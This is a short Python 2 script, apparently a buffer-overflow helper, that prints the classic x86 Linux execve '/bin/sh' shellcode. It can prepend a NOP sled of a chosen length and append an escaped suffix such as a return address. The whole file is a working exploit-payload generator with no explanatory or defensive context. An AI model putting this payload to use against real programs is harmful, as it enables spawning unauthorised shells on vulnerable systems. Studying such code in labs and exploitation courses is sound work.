#!/usr/bin/env python

SHELL_CODE = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
NOP = "\x90"

def shellcode(length=1000):
  return NOP * (length - len(SHELL_CODE)) + SHELL_CODE

if __name__ == '__main__':
  import sys

  # just shell code
  if len(sys.argv) == 1:
    print SHELL_CODE
    exit(0)

  shell = shellcode(int(sys.argv[1]))

  if len(sys.argv) > 2:
    shell += sys.argv[2].decode('string_escape')

  print shell


